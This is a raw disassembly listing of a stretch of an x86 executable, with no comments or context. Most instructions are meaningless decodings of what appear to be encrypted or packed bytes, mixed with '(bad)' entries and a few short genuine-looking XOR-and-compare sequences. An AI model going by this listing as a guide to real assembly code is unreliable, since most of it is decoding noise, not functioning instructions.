  40b508:	mov    edi,0xf0e885df
  40b50d:	jle    0x40b58d
  40b50f:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40b513:	jae    0x40b4c6
  40b515:	rcl    DWORD PTR [ebx+0x5b64db66],0x4d
  40b51c:	push   0xffffffb2
  40b51e:	test   eax,esp
  40b520:	and    cl,bl
  40b522:	push   ds
  40b523:	scas   eax,DWORD PTR es:[edi]
  40b524:	mov    al,0x99
  40b526:	lock dec esp
  40b528:	jecxz  0x40b4e2
  40b52a:	push   edi
  40b52b:	adc    esp,eax
  40b52d:	ds repz test eax,0xddf4f0d9
  40b534:	shl    bh,0xd9
  40b537:	mov    ecx,0xce1e3b1a
  40b53c:	lds    ecx,FWORD PTR [ecx]
  40b53e:	and    esp,DWORD PTR [ebp+0x3e7a4823]
  40b544:	lods   al,BYTE PTR ds:[esi]
  40b545:	in     eax,dx
  40b546:	arpl   dx,di
  40b548:	cwde   
  40b549:	mov    bl,BYTE PTR [eax]
  40b54b:	jl     0x40b528
  40b54d:	in     al,0xd1
  40b54f:	loop   0x40b4f9
  40b551:	outs   dx,BYTE PTR ds:[esi]
  40b552:	adc    al,0xe
  40b554:	push   ss
  40b555:	shl    BYTE PTR [ebx],0xb4
  40b558:	xor    ebx,edi
  40b55a:	jns    0x40b4ed
  40b55c:	daa    
  40b55d:	cdq    
  40b55e:	not    BYTE PTR ds:0x39a832f1
  40b564:	nop
  40b565:	sti    
  40b566:	std    
  40b567:	dec    esp
  40b568:	stos   DWORD PTR es:[edi],eax
  40b569:	push   ebp
  40b56a:	xchg   edx,eax
  40b56b:	enter  0xbc02,0xf4
  40b56f:	test   DWORD PTR [edi+0x5a],esi
  40b572:	test   ecx,eax
  40b574:	sar    BYTE PTR [esi+0x47],cl
  40b577:	not    DWORD PTR [edi]
  40b579:	stos   BYTE PTR es:[edi],al
  40b57a:	or     edi,esp
  40b57c:	jmp    0x7095:0xd9079542
  40b583:	cmp    DWORD PTR [esi-0x49],0xffffffd1
  40b587:	push   edx
  40b588:	ins    BYTE PTR es:[edi],dx
  40b589:	sbb    esi,DWORD PTR ss:[edx-0x4c9250c7]
  40b590:	mov    esp,0xcc3ef7cb
  40b595:	loope  0x40b52f
  40b597:	inc    edx
  40b598:	enter  0x9300,0xff
  40b59c:	ret    
  40b59d:	fwait
  40b59e:	add    DWORD PTR [eax+0x41483940],ebp
  40b5a4:	jnp    0x40b591
  40b5a6:	pop    ss
  40b5a7:	std    
  40b5a8:	jecxz  0x40b584
  40b5aa:	jmp    0x779b:0x88ab029e
  40b5b1:	ds jne 0x40b5cc
  40b5b4:	adc    ah,BYTE PTR [ebp-0x57]
  40b5b7:	dec    ebx
  40b5b8:	idiv   DWORD PTR [edx+0xbf51d87]
  40b5be:	jns    0x40b5eb
  40b5c0:	ficomp DWORD PTR [edi-0x21c99286]
  40b5c6:	loop   0x40b593
  40b5c8:	pop    ecx
  40b5c9:	sar    DWORD PTR [edx-0x8],0x80
  40b5cd:	pop    ds
  40b5ce:	push   edx
  40b5cf:	loopne 0x40b5c7
  40b5d1:	adc    ecx,ecx
  40b5d3:	pop    ecx
  40b5d4:	aad    0x1d
  40b5d6:	dec    edx
  40b5d7:	ss sar al,cl
  40b5da:	xchg   edx,eax
  40b5db:	inc    ebp
  40b5dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b5dd:	mov    bl,BYTE PTR [ecx+0x60fd0e32]
  40b5e3:	test   eax,0x4a607388
  40b5e8:	addr16 xchg ebp,eax
  40b5ea:	imul   esp,eax,0x46
  40b5ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b5ee:	sti    
  40b5ef:	or     al,0xf5
  40b5f1:	mov    ecx,0x6d3ec542
  40b5f6:	xchg   edx,eax
  40b5f7:	push   edx
  40b5f8:	mov    ebp,0x7b5c2e40
  40b5fd:	push   edx
  40b5fe:	call   0x8e34f5b0
  40b603:	push   esp
  40b604:	pop    eax
  40b605:	xchg   edx,eax
  40b606:	dec    edx
  40b607:	xlat   BYTE PTR ds:[ebx]
  40b608:	sahf   
  40b609:	(bad)
  40b60c:	(bad)  
  40b60e:	(bad)
  40b612:	inc    edi
  40b613:	out    0xd4,eax
  40b615:	into   
  40b616:	dec    ebx
  40b617:	inc    eax
  40b618:	ss push esp
  40b61a:	push   0xffffff94
  40b61c:	or     eax,0x77bcdf74
  40b621:	fcmovne st,st(2)
  40b623:	and    eax,ecx
  40b625:	ins    BYTE PTR es:[edi],dx
  40b626:	mov    al,ds:0x972b44
  40b62b:	xchg   BYTE PTR [ebp+0x334b77ea],dh
  40b631:	aam    0xc0
  40b633:	sub    al,0xbe
  40b635:	(bad)  
  40b636:	out    0x5f,al
  40b638:	in     al,dx
  40b639:	cmp    BYTE PTR cs:[edi],0xc5
  40b63d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b63e:	xchg   ebx,eax
  40b63f:	repz mov ebx,0x28be456c
  40b645:	leave  
  40b646:	mov    al,0x58
  40b648:	cmp    esp,edx
  40b64a:	inc    edi
  40b64b:	in     eax,dx
  40b64c:	xchg   BYTE PTR [edx],bl
  40b64e:	inc    esp
  40b64f:	dec    eax
  40b650:	and    BYTE PTR [eax],al
  40b652:	cli    
  40b653:	test   al,0xa9
  40b655:	pop    ds
  40b656:	jne    0x40b606
  40b658:	add    ah,BYTE PTR [ecx+0x54]
  40b65b:	sub    edx,eax
  40b65d:	adc    BYTE PTR [ebp+eax*4+0x1f3d8503],0x6b
  40b665:	sti    
  40b666:	stc    
  40b667:	dec    ebp
  40b668:	sbb    eax,0x3ffffdc7
  40b66d:	dec    esp
  40b66e:	push   ebp
  40b66f:	js     0x40b65f
  40b671:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b672:	pop    ebp
  40b673:	out    0x7a,al
  40b675:	mov    ah,0xc9
  40b677:	sub    edi,DWORD PTR [ebp+0x71]
  40b67a:	cmp    al,0x9d
  40b67c:	ret    
  40b67d:	push   ds
  40b67e:	pop    eax
  40b67f:	xor    cl,BYTE PTR [edi-0x17bd9f8f]
  40b685:	out    dx,eax
  40b686:	(bad)  
  40b687:	sbb    al,0x4
  40b689:	inc    ebp
  40b68a:	daa    
  40b68b:	sub    ah,BYTE PTR [edx-0x54291b6]
  40b691:	or     DWORD PTR [edx-0x43f75916],edx
  40b697:	push   ds
  40b698:	and    bh,al
  40b69a:	nop
  40b69b:	scas   eax,DWORD PTR es:[edi]
  40b69c:	push   ebp
  40b69d:	inc    edx
  40b69e:	arpl   WORD PTR [esi],bx
  40b6a0:	adc    BYTE PTR [edx+0x4b],cl
  40b6a3:	push   edx
  40b6a4:	mov    DWORD PTR [ebx+0x20],esp
  40b6a7:	and    al,0x7a
  40b6a9:	push   cs
  40b6aa:	pop    ss
  40b6ab:	inc    ebx
  40b6ac:	dec    esi
  40b6ad:	cmc    
  40b6ae:	inc    ebx
  40b6af:	mov    cl,al
  40b6b1:	xor    DWORD PTR [ebx+eiz*4-0x6],ebp
  40b6b5:	lock loopne 0x40b6ed
  40b6b8:	and    eax,0x5ce974e1
  40b6bd:	mov    dl,0x99
  40b6bf:	fld    QWORD PTR [ecx-0x4819bded]
  40b6c5:	fadd   st(2),st
  40b6c7:	push   ss
  40b6c8:	cmc    
  40b6c9:	mov    ebp,0xc1bc46f5
  40b6ce:	xor    ah,BYTE PTR [edx+0x77da2532]
  40b6d4:	xor    al,0x97
  40b6d6:	inc    edi
  40b6d7:	std    
  40b6d8:	leave  
  40b6d9:	mov    db6,ebx
  40b6dc:	jle    0x40b698
  40b6de:	cli    
  40b6df:	fist   DWORD PTR [edi]
  40b6e1:	mul    DWORD PTR [eax+0x70]
  40b6e4:	xor    BYTE PTR [edx-0x1a],dh
  40b6e7:	or     eax,0xace2129f
  40b6ec:	int3   
  40b6ed:	into   
  40b6ee:	fs and al,0xb8
  40b6f1:	xchg   esp,eax
  40b6f2:	sahf   
  40b6f3:	stos   BYTE PTR es:[edi],al
  40b6f4:	mov    edi,0x7636db71
  40b6f9:	lods   eax,DWORD PTR ds:[esi]
  40b6fa:	push   edx
  40b6fb:	pop    eax
  40b6fc:	mov    ecx,0x8f95db1f
  40b701:	push   edx
  40b702:	lea    ecx,[ebx+edi*1+0x1d6bdac1]
  40b709:	je     0x40b782
  40b70b:	lock inc edi
  40b70d:	sbb    BYTE PTR [ebp+ebx*8-0x62c2f6c6],bh
  40b714:	loop   0x40b6c2
  40b716:	cmp    BYTE PTR [edi],dl
  40b718:	mov    dl,0x62
  40b71a:	cmp    eax,eax
  40b71c:	mov    eax,0x97674a05
  40b721:	mov    ebx,0xd11cfff8
  40b726:	or     ebp,DWORD PTR [esp+esi*1-0x696fcdb4]
  40b72d:	test   BYTE PTR [ecx],dl
  40b72f:	push   es
  40b730:	pushf  
  40b731:	shl    bh,0xa8
  40b734:	dec    esp
  40b735:	into   
  40b736:	push   cx
  40b738:	jge    0x40b737
  40b73a:	leave  
  40b73b:	retf   0x3c13
  40b73e:	xlat   BYTE PTR ds:[ebx]
  40b73f:	imul   ebx,DWORD PTR [edi+0x71],0x5fef1312
  40b746:	icebp  
  40b747:	iret   
  40b748:	sbb    eax,esp
  40b74a:	rcl    BYTE PTR [ecx-0x4c],1
  40b74d:	jmp    0x3eff4312
  40b752:	pop    edi
  40b753:	mov    dl,0x56
  40b755:	mov    ebx,0xff681a68
  40b75a:	jne    0x40b72c
  40b75c:	push   DWORD PTR [ebp+0xc]
  40b75f:	call   0x410212
  40b764:	mov    eax,DWORD PTR [ebp-0x4]
  40b767:	mov    ecx,DWORD PTR [ebp-0x8]
  40b76a:	xor    eax,0x7510854
  40b76f:	add    eax,ebx
  40b771:	cmp    ecx,eax
  40b773:	jne    0x40b9f9
  40b779:	jmp    0x40b9dc
  40b77e:	mov    edi,0x716ef17f
  40b783:	jo     0x40b7c6
  40b785:	das    
  40b786:	pushf  
  40b787:	dec    edi
  40b788:	je     0x40b75f
  40b78a:	(bad)  
  40b78b:	xlat   BYTE PTR ds:[ebx]
  40b78c:	mov    ch,0xa0
  40b78e:	mov    dl,0xfe
  40b790:	jle    0x40b810
  40b792:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40b796:	imul   DWORD PTR [ebx]
  40b798:	lock xchg ecx,eax
  40b79a:	arpl   di,sp
  40b79c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b79d:	mov    ch,0x21
  40b79f:	scas   eax,DWORD PTR es:[edi]
  40b7a0:	dec    edi
  40b7a1:	gs mov ebx,0xb60b006b
  40b7a7:	(bad)  
  40b7a8:	stos   BYTE PTR es:[edi],al
  40b7a9:	sar    DWORD PTR [edx+ecx*1],1
  40b7ac:	xor    al,0x4e
  40b7ae:	das    
  40b7af:	fs dec cx
  40b7b2:	mov    edi,0xb54df67
  40b7b7:	mov    es,ebx
  40b7b9:	ror    dh,1
  40b7bb:	cmp    al,0xfa
  40b7bd:	adc    BYTE PTR [ebx+0x698ee127],bh
  40b7c3:	xchg   esi,eax
  40b7c4:	cmp    DWORD PTR [ecx+edi*4],ebx
  40b7c7:	jne    0x40b800
  40b7c9:	bound  ebx,QWORD PTR [edi]
  40b7cb:	loope  0x40b7c0
  40b7cd:	repnz push es
  40b7cf:	dec    ebx
  40b7d0:	in     al,dx
  40b7d1:	adc    al,0xc9
  40b7d3:	push   ebp
  40b7d4:	stos   BYTE PTR es:[edi],al
  40b7d5:	mov    ds:0x9a260900,eax
  40b7da:	jle    0x40b859
  40b7dc:	and    DWORD PTR [ecx-0x6ebaf96],ecx
  40b7e2:	cmp    eax,0xb5e35769
  40b7e7:	mov    ds:0xfdf05f7f,al
  40b7ec:	ja     0x40b83e
  40b7ee:	xor    al,0x46
  40b7f0:	lds    edx,FWORD PTR [ebx-0x57]
  40b7f3:	xor    BYTE PTR [ebx],dl
  40b7f5:	jmp    0x40b82a
  40b7f7:	sar    dh,cl
  40b7f9:	in     eax,0xc
  40b7fb:	add    BYTE PTR [ebx+0x69a63bc2],0x81
  40b802:	cmp    BYTE PTR [eax],bh
  40b804:	int    0x40
  40b806:	xchg   BYTE PTR [edi],al
  40b808:	add    al,0xc9
  40b80a:	add    dh,BYTE PTR [edx+0x29]
  40b80d:	or     DWORD PTR [edi+0x3e],0xede0c95c
  40b814:	or     bl,BYTE PTR [edi+0x772a7152]
  40b81a:	icebp  
  40b81b:	mov    al,BYTE PTR [ecx-0x2c]
  40b81e:	setae  BYTE PTR [eax+edi*2-0x5d3626d]
  40b826:	mov    ch,0xcb
  40b828:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b829:	sub    edi,esi
  40b82b:	loope  0x40b880
  40b82d:	cmp    DWORD PTR [edi-0x61],edi
  40b830:	push   DWORD PTR [esi+0x79]
  40b833:	sub    esi,esi
  40b835:	in     eax,0x46
  40b837:	loop   0x40b7ed
  40b839:	scas   eax,DWORD PTR es:[edi]
  40b83a:	xchg   ebx,eax
  40b83b:	jge    0x40b7bd
  40b83d:	int3   
  40b83e:	cmp    DWORD PTR [ebp+0x78c122a0],edx
  40b844:	pop    ss
  40b845:	push   0xfffffffc
  40b847:	pop    ss
  40b848:	mov    ecx,0x90204cdb
  40b84d:	(bad)  
  40b84e:	aad    0x5b
  40b850:	ret    0x6611
  40b853:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b854:	add    cl,BYTE PTR [edx-0x30]
  40b857:	mov    bh,0xe0
  40b859:	cwde   
  40b85a:	mov    DWORD PTR [ebx+0x239484bb],ebx
  40b860:	lahf   
  40b861:	bound  ebp,QWORD PTR [esi+0x1945a3cd]
  40b867:	push   esp
  40b868:	test   BYTE PTR [esi-0x5a],cl
  40b86b:	cdq    
  40b86c:	pushf  
  40b86d:	fst    st(5)
  40b86f:	cmp    edi,DWORD PTR [eax+0x364b644a]
  40b875:	das    
  40b876:	pop    ss
  40b877:	jecxz  0x40b87b
  40b879:	sbb    BYTE PTR ds:0xbbb33e73,0xda
  40b880:	call   0xb8859e93
  40b885:	jb     0x40b815
  40b887:	inc    ecx
  40b888:	call   0x378d1360
  40b88d:	clc    
  40b88e:	stos   DWORD PTR es:[edi],eax
  40b88f:	out    dx,eax
  40b890:	adc    ebp,ecx
  40b892:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b893:	or     DWORD PTR [esi-0x7bf5118e],edx
  40b899:	add    DWORD PTR [ecx],0x1b
  40b89c:	jo     0x40b891
  40b89e:	lahf   
  40b89f:	(bad)  
  40b8a0:	sub    esi,DWORD PTR [eax+0x6c]
  40b8a3:	popf   
  40b8a4:	enter  0x4032,0xcf
  40b8a8:	aaa    
  40b8a9:	and    BYTE PTR [ebx],dl
  40b8ab:	in     eax,dx
  40b8ac:	mov    gs,WORD PTR [ecx+ebp*2-0x786ff72f]
  40b8b3:	jb     0x40b8f0
  40b8b5:	mov    esp,0xb45dfb43
  40b8ba:	adc    BYTE PTR [edx-0x68f6df0d],cl
  40b8c0:	das    
  40b8c1:	xchg   esi,eax
  40b8c2:	dec    edi
  40b8c3:	xor    ah,BYTE PTR [eax-0x42]
  40b8c6:	or     BYTE PTR [ebp+0x43],0x13
  40b8ca:	scas   eax,DWORD PTR es:[edi]
  40b8cb:	mov    ecx,0x14bbd31a
  40b8d0:	test   ebx,esp
  40b8d2:	fisub  DWORD PTR [ebx+eax*4-0x7c7e2e68]
  40b8d9:	mov    bl,0xeb
  40b8db:	and    bh,BYTE PTR [esi-0x38]
  40b8de:	or     al,0xc3
  40b8e0:	js     0x40b878
  40b8e2:	and    dh,BYTE PTR [ebp-0x5221eb1a]
  40b8e8:	ins    DWORD PTR es:[edi],dx
  40b8e9:	sub    ecx,DWORD PTR [ebp-0x8]
  40b8ec:	iret   
  40b8ed:	sub    edx,DWORD PTR [esi+0x1a6a12e3]
  40b8f3:	fidivr WORD PTR [ebx-0x692194f8]
  40b8f9:	out    0x9b,eax
  40b8fb:	jns    0x40b888
  40b8fd:	cvtpi2ps xmm1,mm6
  40b900:	loope  0x40b934
  40b902:	clc    
  40b903:	sub    al,0xaa
  40b905:	loope  0x40b917
  40b907:	cmp    eax,DWORD PTR [eax+0x4e1597e8]
  40b90d:	sbb    BYTE PTR [edi+0x31480682],dl
  40b913:	xchg   esp,eax
  40b914:	(bad)  
  40b915:	ins    BYTE PTR es:[edi],dx
  40b916:	sbb    edi,DWORD PTR [esi]
  40b918:	mov    cl,BYTE PTR [edi]
  40b91a:	mov    ah,0xa2
  40b91c:	add    eax,ebp
  40b91e:	mov    esp,0x74fe994c
  40b923:	ss out 0xe1,al
  40b926:	jne    0x40b900
  40b928:	adc    cl,BYTE PTR [ebp+0x1]
  40b92b:	xchg   BYTE PTR [ebx],dl
  40b92d:	aad    0x7a
  40b92f:	sti    
  40b930:	cs popa 
  40b932:	call   0xc813d82c
  40b937:	sub    ebp,esp
  40b939:	out    dx,eax
  40b93a:	mov    esp,0x76865106
  40b93f:	cli    
  40b940:	mov    esi,?
  40b942:	les    eax,FWORD PTR [edi]
  40b944:	je     0x40b909
  40b946:	sti    
  40b947:	mov    ah,0xbd
  40b949:	mov    al,ds:0x79c711da
  40b94e:	add    BYTE PTR ds:0x1aa65bd1,dl
  40b954:	shl    BYTE PTR [eax],cl
  40b956:	ins    BYTE PTR es:[edi],dx
  40b957:	sub    ebp,DWORD PTR [esi-0x12]
  40b95a:	mov    bl,BYTE PTR [esi-0x174fd14d]
  40b960:	enter  0x76b6,0xb
  40b964:	mov    ebx,DWORD PTR [ecx-0x69]
  40b967:	or     al,0x2
  40b969:	mov    ecx,0xdaeaf274
  40b96e:	mov    eax,0x18a4cc07
  40b973:	mov    ebx,0xb7d1a461
  40b978:	jg     0x40b942
  40b97a:	inc    eax
  40b97b:	adc    ch,dh
  40b97d:	or     bl,ch
  40b97f:	sub    eax,0xe7ed5425
  40b984:	adc    BYTE PTR [edi+0x3be4295],ch
  40b98a:	inc    edi
  40b98b:	jns    0x40b94c
  40b98d:	sbb    esp,DWORD PTR [eax]
  40b98f:	data16 jbe 0x40b98e
  40b992:	jp     0x40b9bc
  40b994:	jmp    0xf3f3:0xf18e0ce3
  40b99b:	and    DWORD PTR [ebp-0x1a],esp
  40b99e:	dec    ecx
  40b99f:	jmp    0x40b951
  40b9a1:	mov    esp,0x8b02327b
  40b9a6:	dec    edx
  40b9a7:	sar    DWORD PTR [esi-0x66489b74],1
  40b9ad:	jle    0x40b958
  40b9af:	push   ecx
  40b9b0:	hlt    
  40b9b1:	and    BYTE PTR [edx+0x15d1ec81],bh
  40b9b7:	enter  0xc234,0xad
  40b9bb:	in     eax,dx
  40b9bc:	xchg   ecx,eax
  40b9bd:	jnp    0x40ba33
  40b9bf:	push   ss
  40b9c0:	cmp    esp,DWORD PTR [edx-0x39]
  40b9c3:	repz adc edx,esp
  40b9c6:	repnz sub eax,0xc9afb06f
  40b9cc:	xor    ch,0x65
  40b9cf:	into   
  40b9d0:	outs   dx,BYTE PTR ds:[esi]
  40b9d1:	ins    BYTE PTR es:[edi],dx
  40b9d2:	push   edi
  40b9d3:	sub    DWORD PTR [edx+eiz*2+0x525e486a],eax
  40b9da:	and    bh,al
  40b9dc:	mov    eax,DWORD PTR [ebp-0x20]
  40b9df:	inc    edi
  40b9e0:	cmp    edi,eax
  40b9e2:	jb     0x40a46c
  40b9e8:	jmp    0x40bc6c
  40b9ed:	mov    eax,DWORD PTR [ebp-0x4]
  40b9f0:	xor    eax,esi
  40b9f2:	add    eax,ebx
  40b9f4:	jmp    0x40d598
  40b9f9:	mov    eax,DWORD PTR [ebp-0x2c]
  40b9fc:	jmp    0x40bc5f
  40ba01:	test   BYTE PTR [ecx],ch
  40ba03:	popa   
  40ba04:	lahf   
  40ba05:	jno    0x40ba7e
  40ba07:	inc    eax
  40ba08:	xor    DWORD PTR [edi+ebp*8+0x462ea808],eax
  40ba0f:	add    eax,0x7efd7c41
  40ba14:	jle    0x40ba4e
  40ba16:	jl     0x40ba96
  40ba18:	jle    0x40ba78
  40ba1a:	fcom   QWORD PTR [esi-0x53]
  40ba1d:	sub    BYTE PTR [eax],0xfd
  40ba20:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ba21:	je     0x40b9c4
  40ba23:	test   esp,edi
  40ba25:	test   eax,0x87958592
  40ba2a:	ja     0x40ba5c
  40ba2c:	(bad)  
  40ba2d:	xchg   ebp,eax
  40ba2e:	mov    cl,0x54
  40ba30:	add    eax,0x3cfff397
  40ba35:	les    edi,FWORD PTR [esi-0x50]
  40ba38:	out    dx,eax
  40ba39:	jmp    DWORD PTR ss:[ebp+0xfdd9c15]
  40ba40:	mov    eax,0x3f24319c
  40ba45:	inc    esi
  40ba46:	xchg   ebp,eax
  40ba47:	xor    al,al
  40ba49:	fiadd  DWORD PTR [edi]
  40ba4b:	stos   DWORD PTR es:[edi],eax
  40ba4c:	mov    ds:0x2be144b7,al
  40ba51:	imul   ebp,DWORD PTR [edi+0x5f],0xffffff84
  40ba55:	jl     0x40ba69
  40ba57:	push   esp
  40ba58:	push   edi
  40ba59:	mov    dl,0x44
  40ba5b:	or     DWORD PTR [ecx],eax
  40ba5d:	out    0xfa,al
  40ba5f:	pop    es
  40ba60:	pop    edx
  40ba61:	addr16 (bad) 
  40ba63:	sbb    BYTE PTR ds:0xb602a21e,dl
  40ba69:	cs aaa 
  40ba6b:	inc    eax
  40ba6c:	in     eax,dx
  40ba6d:	bound  ax,DWORD PTR [eax]
  40ba70:	sbb    edi,DWORD PTR [edx-0x6ba942a5]
  40ba76:	stos   DWORD PTR es:[edi],eax
  40ba77:	les    edi,FWORD PTR [esi-0x4f]
  40ba7a:	out    dx,eax
  40ba7b:	sub    DWORD PTR [edx+0x528c3f80],esi
  40ba81:	push   edx
  40ba82:	and    al,0x4e
  40ba84:	adc    DWORD PTR [edx+eiz*4-0x287bd307],ebx
  40ba8b:	dec    esp
  40ba8c:	mov    edi,0xfb1c09a0
  40ba91:	pop    esp
  40ba92:	out    dx,eax
  40ba93:	sub    al,0xc5
  40ba95:	push   cs
  40ba96:	pushf  
  40ba97:	mov    ah,0xa2
  40ba99:	xchg   esp,eax
  40ba9a:	push   ecx
  40ba9b:	fwait
  40ba9c:	repnz sbb al,0x2f
  40ba9f:	mov    ch,0xac
  40baa1:	xchg   esi,eax
  40baa2:	dec    edi
  40baa3:	fdiv   st(1),st
  40baa5:	mov    DWORD PTR [esi],0x561e56d4
  40baab:	push   esi
  40baac:	rcr    DWORD PTR [eax],1
  40baae:	scas   al,BYTE PTR es:[edi]
  40baaf:	sbb    al,0x7
  40bab1:	ss ret 0xfea8
  40bab5:	mov    ebx,0x8272fb5a
  40baba:	sbb    dl,0x99
  40babd:	out    dx,al
  40babe:	pop    edx
  40babf:	ror    DWORD PTR [ebp+0x25],1
  40bac2:	jae    0x40baf1
  40bac4:	les    ecx,FWORD PTR [ebp+ebp*1-0x5197b551]
  40bacb:	sbb    eax,0x6bc5f928
  40bad0:	cmovae esp,DWORD PTR ss:[edx-0x31]
  40bad5:	imul   ecx,esp,0x76
  40bad8:	xchg   BYTE PTR [edx+0x5f24d5f9],dl
  40bade:	xchg   ebx,eax
  40badf:	mov    esi,esi
  40bae1:	jmp    0xad8:0x65e611f7
  40bae8:	cmc    
  40bae9:	jne    0x40bb27
  40baeb:	cdq    
  40baec:	mov    ecx,0x1e9845c7
  40baf1:	inc    esi
  40baf2:	xchg   cl,cl
  40baf4:	jg     0x40bb1b
  40baf6:	pop    edx
  40baf7:	or     BYTE PTR [ebp+0x61589d4d],cl
  40bafd:	test   DWORD PTR [edx-0x7c28df02],ecx
  40bb03:	or     al,0xb
  40bb05:	push   eax
  40bb06:	(bad)  
  40bb07:	fisttp WORD PTR [ebx-0x5b]
  40bb0a:	stc    
  40bb0b:	jp     0x40bb45
  40bb0d:	cmp    DWORD PTR [ecx],ebp
  40bb0f:	push   esp
  40bb10:	ud2    
  40bb12:	loop   0x40baaa
  40bb14:	pop    ebp
  40bb15:	pop    esp
  40bb16:	test   DWORD PTR [ecx],ebp
  40bb18:	adc    al,BYTE PTR [ebx]
  40bb1a:	mov    dh,0x86
  40bb1c:	sub    al,ah
  40bb1e:	adc    edi,DWORD PTR ds:0xb4faa080
  40bb24:	xor    al,0xb0
  40bb26:	add    BYTE PTR [ecx+0x21],0xf7
  40bb2a:	lds    edx,FWORD PTR [ecx]
  40bb2c:	mov    dh,0x64
  40bb2e:	aam    0x31
  40bb30:	sub    al,0x55
  40bb32:	xchg   ebx,eax
  40bb33:	sub    DWORD PTR [ebx-0x5c],0xffffffea
  40bb37:	or     DWORD PTR [eax],0xffffffd3
  40bb3a:	inc    eax
  40bb3b:	sub    BYTE PTR [ebx-0x29],dh
  40bb3e:	mov    eax,ds:0x1068f7f7
  40bb43:	jbe    0x40bb0a
  40bb45:	(bad)  
  40bb46:	out    0xbb,al
  40bb48:	push   esi
  40bb49:	lahf   
  40bb4a:	cmp    eax,0xa2015144
  40bb4f:	mov    dh,0x44
  40bb51:	js     0x40bb9c
  40bb53:	fnstcw WORD PTR [ebx]
  40bb55:	push   ss
  40bb56:	push   ss
  40bb57:	pop    ds
  40bb58:	xchg   ebx,eax
  40bb59:	inc    ebx
  40bb5a:	sbb    al,0xc6
  40bb5c:	inc    eax
  40bb5d:	push   es
  40bb5e:	fwait
  40bb5f:	or     BYTE PTR [esi],al
  40bb61:	jp     0x40bb78
  40bb63:	in     al,dx
  40bb64:	adc    BYTE PTR [ebx],bl
  40bb66:	jne    0x40bbc7
  40bb68:	outs   dx,DWORD PTR ds:[esi]
  40bb69:	dec    edi
  40bb6a:	les    esi,FWORD PTR [ebx+0xb5ed164]
  40bb70:	fdivr  DWORD PTR [ecx]
  40bb72:	test   al,0x72
  40bb74:	push   es
  40bb75:	add    eax,0xc8c08293
  40bb7a:	push   eax
  40bb7b:	xchg   DWORD PTR [ebp+0x2d],edx
  40bb7e:	cmp    bh,ah
  40bb80:	pop    edi
  40bb81:	pop    ecx
  40bb82:	addr16 xor ebp,edi
  40bb85:	jmp    0xaa6ae5e3
  40bb8a:	into   
  40bb8b:	loope  0x40bbc2
  40bb8d:	sahf   
  40bb8e:	mov    ebx,0xb8a27684
  40bb93:	jnp    0x40bbd5
  40bb95:	or     DWORD PTR [ebx],0xffffffb4
  40bb98:	jmp    0x492e:0xda7d
  40bb9e:	jbe    0x40bbd7
  40bba0:	xchg   esi,eax
  40bba1:	mov    edx,0x50d4d8d0
  40bba6:	dec    esp
  40bba7:	cli    
  40bba8:	push   esi
  40bba9:	stos   BYTE PTR es:[edi],al
  40bbaa:	adc    bh,BYTE PTR [eax]
  40bbac:	scas   al,BYTE PTR es:[edi]
  40bbad:	(bad)  
  40bbae:	in     al,dx
  40bbaf:	jbe    0x40bbe3
  40bbb1:	xor    al,0xd1
  40bbb3:	xor    bh,dl
  40bbb5:	(bad)  
  40bbb6:	call   DWORD PTR [esi]
  40bbb8:	adc    dh,BYTE PTR [ecx+0x21]
  40bbbb:	add    edx,esi
  40bbbd:	popf   
  40bbbe:	or     esi,DWORD PTR [ebp-0xb0270c6]
  40bbc4:	push   ds
  40bbc5:	dec    ebp
  40bbc6:	inc    ebx
  40bbc7:	jbe    0x40bb90
  40bbc9:	adc    dl,BYTE PTR [edi-0x44]
  40bbcc:	repnz cwde 
  40bbce:	shl    BYTE PTR [edx+0x5f],0xb8
  40bbd2:	jmp    0x7031:0x6a9665b5
  40bbd9:	jae    0x40bb74
  40bbdb:	cmp    DWORD PTR [ecx-0x2d727277],ebx
  40bbe1:	cmovb  eax,DWORD PTR [edx-0x3cb2f8b8]
  40bbe8:	jno    0x40bb7b
  40bbea:	cmp    ebp,DWORD PTR [eax-0x79950657]
  40bbf0:	in     al,0x9f
  40bbf2:	ins    BYTE PTR es:[edi],dx
  40bbf3:	call   0x3681:0xd7e82f1b
  40bbfa:	js     0x40bc7a
  40bbfc:	popf   
  40bbfd:	(bad)  
  40bbfe:	push   eax
  40bc00:	add    BYTE PTR [esi+0x26],bh
  40bc03:	clts   
  40bc05:	int    0x4f
  40bc07:	xchg   esp,eax
  40bc08:	fist   DWORD PTR [ecx-0x11]
  40bc0b:	rol    ah,cl
  40bc0d:	scas   eax,DWORD PTR es:[edi]
  40bc0e:	ss jnp 0x40bbb8
  40bc11:	imul   ecx,DWORD PTR [ebx+esi*2],0x6ef0c470
  40bc18:	ins    BYTE PTR es:[edi],dx
  40bc19:	inc    esp
  40bc1a:	or     ah,bl
  40bc1c:	pop    ecx
  40bc1d:	nop
  40bc1e:	or     ah,BYTE PTR [ecx]
  40bc20:	jb     0x40bbfc
  40bc22:	call   DWORD PTR [esi+0x1a]
  40bc25:	mov    ch,0x35
  40bc27:	push   eax
  40bc28:	ror    BYTE PTR [edx-0x13],0x2
  40bc2c:	test   DWORD PTR [esi-0x7d4e1fe0],0x2723236c
  40bc36:	mov    ebp,0x163f27de
  40bc3b:	(bad)  
  40bc3d:	mov    esp,0x1c6fc90a
  40bc42:	adc    esi,DWORD PTR cs:[edx+0x12]
  40bc46:	ror    DWORD PTR [ebx],1
  40bc48:	add    ecx,DWORD PTR [ebx+ecx*8-0x27]
  40bc4c:	dec    esp
  40bc4d:	cmc    
  40bc4e:	adc    bp,WORD PTR [ebx]
  40bc51:	fbstp  TBYTE PTR [eax+0x18]
  40bc54:	in     eax,0xb8
  40bc56:	fcmovnu st,st(5)
  40bc58:	jno    0x40bcae
  40bc5a:	jp     0x40bc0c
  40bc5c:	sbb    al,BYTE PTR [edx]
  40bc5e:	cmp    cl,BYTE PTR [edi]
  40bc60:	mov    bh,0x4
  40bc62:	js     0x40bbef
  40bc64:	dec    ebp
  40bc65:	in     al,dx
